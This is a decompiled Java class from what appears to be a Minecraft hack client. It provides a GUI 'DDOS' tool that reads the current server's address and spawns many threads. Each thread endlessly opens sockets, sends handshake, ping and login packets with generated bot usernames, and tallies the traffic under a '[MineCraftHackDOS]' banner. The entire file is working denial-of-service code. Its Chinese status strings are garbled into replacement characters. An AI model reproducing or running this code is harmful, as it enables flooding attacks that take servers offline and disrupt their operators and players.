/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.google.gson.JsonElement
 *  com.google.gson.JsonParser
 */
package zelix.gui.others;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import java.awt.Color;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.border.EmptyBorder;
import zelix.hack.hacks.ServerCrasher;
import zelix.otherhacks.net.wurstclient.forge.utils.ChatUtils;
import zelix.utils.Wrapper;

public class DDOSWindow
extends JFrame {
    public static long data = 0L;
    public static String[] part1;
    public static int port;
    public static byte[] hand;
    public static byte[] login;
    public static byte[] ping;
    public static byte[] pack;
    public static int version;
    public static long killT;
    public static long point;
    public static String text;
    private JPanel contentPane;

    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable(){

            @Override
            public void run() {
                try {
                    DDOSWindow frame = new DDOSWindow();
                    frame.setVisible(true);
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public DDOSWindow() {
        this.setTitle("DDOS");
        this.setBounds(100, 100, 450, 300);
        this.contentPane = new JPanel();
        this.contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        this.setContentPane(this.contentPane);
        this.contentPane.setLayout(null);
        JTextArea textArea = new JTextArea();
        textArea.setBackground(Color.WHITE);
        textArea.setToolTipText("\ufffd\ufffd\ufffd\ufffd\ufffd\u0138\ufffd\ufffd\ufffd\ufffd\u05b7\ufffd");
        textArea.setBounds(0, 39, 434, 24);
        this.contentPane.add(textArea);
        final JTextArea wversion = new JTextArea();
        wversion.setBackground(Color.WHITE);
        wversion.setToolTipText("\ufffd\u6c7e\ufffd\ufffd");
        wversion.setBounds(0, 39, 434, 24);
        this.contentPane.add(wversion);
        JButton btnNewButton = new JButton("Run");
        btnNewButton.setBounds(10, 74, 103, 25);
        this.contentPane.add(btnNewButton);
        btnNewButton.addActionListener(new ActionListener(){

            @Override
            public void actionPerformed(ActionEvent e) {
                DataOutputStream handshake;
                ByteArrayOutputStream b;
                ChatUtils.message("\ufffd\ufffd\u02bc");
                String ip = Wrapper.INSTANCE.mc().getCurrentServerData().serverIP.toLowerCase();
                part1 = ip.split(":");
                port = Integer.parseInt(part1[1]);
                int num = ((Double)ServerCrasher.threadNum.getValue()).intValue();
                ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd");
                try {
                    ChatUtils.message("\ufffd\ufffd\ufffd\u0435\ufffd\u04bb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd");
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(0);
                    DDOSWindow.writeVarInt(handshake, -1);
                    DDOSWindow.writeVarInt(handshake, part1[0].length());
                    handshake.writeBytes(part1[0]);
                    handshake.writeShort(port);
                    DDOSWindow.writeVarInt(handshake, 1);
                    hand = b.toByteArray();
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(1);
                    handshake.writeLong(Long.MAX_VALUE);
                    ping = b.toByteArray();
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(0);
                    pack = b.toByteArray();
                }
                catch (Exception var5) {
                    var5.printStackTrace();
                }
                ChatUtils.message("\ufffd\u6c7e\ufffd\ufffd\ufffd\ufffd\ufffd");
                boolean lock = true;
                try {
                    Socket s1 = new Socket(part1[0], port);
                    InputStream is = s1.getInputStream();
                    DataInputStream di = new DataInputStream(is);
                    OutputStream os = s1.getOutputStream();
                    DataOutputStream dos = new DataOutputStream(os);
                    DDOSWindow.writeVarInt(dos, hand.length);
                    dos.write(hand);
                    DDOSWindow.writeVarInt(dos, pack.length);
                    dos.write(pack);
                    dos.flush();
                    data += (long)DDOSWindow.readVarInt(di);
                    DDOSWindow.readVarInt(di);
                    byte[] temp1 = new byte[DDOSWindow.readVarInt(di)];
                    di.readFully(temp1);
                    String motdT = new String(temp1);
                    JsonParser json = new JsonParser();
                    JsonElement part5 = json.parse(motdT);
                    JsonElement part6 = part5.getAsJsonObject().get("version");
                    ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u6c7e:" + part6.getAsJsonObject().get("name").getAsString() + ",\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:" + part6.getAsJsonObject().get("protocol").getAsInt());
                    version = part6.getAsJsonObject().get("protocol").getAsInt();
                    di.close();
                    is.close();
                    dos.close();
                    os.close();
                    s1.close();
                }
                catch (Exception e1) {
                    lock = false;
                    e1.printStackTrace();
                    ChatUtils.message("\u033d\ufffd\ufffd\u02a7\ufffd\u0723\ufffd\ufffd\ufffd\ufffd\u05b6\ufffd\ufffd\ufffd\ufffd\ufffd\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:");
                    version = Integer.parseInt(wversion.getText());
                }
                if (lock) {
                    ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0237\ufffd\ufffd\u042d\ufffd\ufffd\u6c7e\ufffd\ufffd:");
                    version = Integer.parseInt(wversion.getText());
                }
                try {
                    b = new ByteArrayOutputStream();
                    handshake = new DataOutputStream(b);
                    handshake.write(0);
                    DDOSWindow.writeVarInt(handshake, version);
                    DDOSWindow.writeVarInt(handshake, part1[0].length());
                    handshake.writeBytes(part1[0]);
                    handshake.writeShort(port);
                    DDOSWindow.writeVarInt(handshake, 2);
                    login = b.toByteArray();
                }
                catch (Exception e2) {
                    e2.printStackTrace();
                }
                ChatUtils.message("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u07f3\ufffdPS:\ufffd\ufffd\u02b1\ufffd\ufffd\ufffd\ufffd\u02be\"[MineCraftHackDOS]>0byte\"\ufffd\ufffd\u03e2\ufffd\ufffd\u03aa\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd");
                Thread4 thread4 = new Thread4();
                Thread thread3 = new Thread(thread4);
                thread3.start();
                for (int i = 1; i <= num; ++i) {
                    Thread1 thread1 = new Thread1();
                    Thread thread2 = new Thread(thread1);
                    thread2.start();
                }
            }
        });
    }

    public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
        while (true) {
            if ((paramInt & 0xFFFFFF80) == 0) {
                out.writeByte(paramInt);
                return;
            }
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
    }

    public static int readVarInt(DataInputStream in) throws IOException {
        byte k;
        int i = 0;
        int j = 0;
        do {
            k = in.readByte();
            i |= (k & 0x7F) << j++ * 7;
            if (j <= 5) continue;
            throw new RuntimeException("VarInt\u032b\ufffd\ufffd");
        } while ((k & 0x80) == 128);
        return i;
    }

    static {
        version = -1;
        killT = 0L;
        point = 0L;
        text = "";
    }

    class Thread4
    implements Runnable {
        Thread4() {
        }

        @Override
        public void run() {
            try {
                while (true) {
                    double a;
                    Thread.sleep(3000L);
                    if (data >= 0x40000000L) {
                        a = (double)data / 1.073741824E9;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + killT + "thread");
                        continue;
                    }
                    if (data >= 0x100000L) {
                        a = (double)data / 1048576.0;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "mb," + killT + "thread");
                        continue;
                    }
                    if (data >= 1024L) {
                        a = (double)data / 1024.0;
                        ChatUtils.warning("[MineCraftHackDOS]>" + a + "kb," + killT + "thread");
                        continue;
                    }
                    if (data >= 1024L) continue;
                    ChatUtils.warning("[MineCraftHackDOS]>" + data + "byte," + killT + "thread");
                }
            }
            catch (InterruptedException e) {
                e.printStackTrace();
                return;
            }
        }
    }

    class Thread1
    implements Runnable {
        Thread1() {
        }

        @Override
        public void run() {
            while (true) {
                try {
                    while (true) {
                        Socket s = new Socket(part1[0], port);
                        InputStream is = s.getInputStream();
                        DataInputStream di = new DataInputStream(is);
                        OutputStream os = s.getOutputStream();
                        DataOutputStream dos = new DataOutputStream(os);
                        DDOSWindow.writeVarInt(dos, hand.length);
                        dos.write(hand);
                        DDOSWindow.writeVarInt(dos, pack.length);
                        dos.write(pack);
                        dos.flush();
                        data += (long)DDOSWindow.readVarInt(di);
                        DDOSWindow.readVarInt(di);
                        byte[] temp1 = new byte[DDOSWindow.readVarInt(di)];
                        di.readFully(temp1);
                        try {
                            DDOSWindow.writeVarInt(dos, ping.length);
                            dos.write(ping);
                            dos.flush();
                            data += (long)DDOSWindow.readVarInt(di);
                            DDOSWindow.readVarInt(di);
                            di.readLong();
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                        di.close();
                        is.close();
                        dos.close();
                        os.close();
                        s.close();
                        s = new Socket(part1[0], port);
                        is = s.getInputStream();
                        di = new DataInputStream(is);
                        os = s.getOutputStream();
                        dos = new DataOutputStream(os);
                        DDOSWindow.writeVarInt(dos, login.length);
                        dos.write(login);
                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                        DataOutputStream handshake = new DataOutputStream(b);
                        handshake.write(0);
                        String temp5 = text + point;
                        ++point;
                        DDOSWindow.writeVarInt(handshake, temp5.length());
                        handshake.writeBytes(temp5);
                        byte[] username = b.toByteArray();
                        DDOSWindow.writeVarInt(dos, username.length);
                        dos.write(username);
                        dos.flush();
                        s.setSoTimeout(1500);
                        try {
                            while (true) {
                                int length = DDOSWindow.readVarInt(di);
                                data += (long)length;
                                byte[] lj = new byte[length];
                                di.readFully(lj);
                            }
                        }
                        catch (Exception e) {
                            di.close();
                            is.close();
                            dos.close();
                            os.close();
                            s.close();
                            continue;
                        }
                        break;
                    }
                }
                catch (Exception e) {
                    ++killT;
                    continue;
                }
                break;
            }
        }
    }
}

